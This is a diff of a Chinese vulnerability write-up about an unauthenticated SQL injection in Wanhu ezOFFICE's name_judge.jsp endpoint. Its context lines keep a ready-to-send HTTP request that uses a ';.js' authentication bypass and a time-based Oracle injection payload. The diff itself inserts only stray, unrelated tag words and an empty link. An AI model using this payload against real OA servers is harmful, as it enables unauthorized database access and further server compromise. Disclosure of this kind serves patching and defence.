@@ -6,7 +6,9 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-万户OA [ezoffice](https://mrxn.net/tag/ezoffice) 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。万户 ezOFFICE name\_judge.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql注入)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/漏洞)获取数据库权限，深入利用可获取服务器权限。
+万户OA [ezoffice](https://mrxn.net/tag/ezoffice) 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。万户 ezOFFICE name\_judge.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql注入)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/漏洞)获取数据库权限，深入利用可获取服务器权限。
+
+编程
 
 # 影响版本
 
@@ -54,6 +56,8 @@ try{
 
 权限绕过分析参考：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
 
+广告与营销
+
 ```
 POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
 Host: ezoffice.mrxn.net
@@ -68,3 +72,5 @@ formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',4)--&govFormName=1&formId=1
 
 其他万户OA 相关[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)  
 [万户OA系列漏洞](https://mrxn.net/tag/ezoffice)
+
+软件
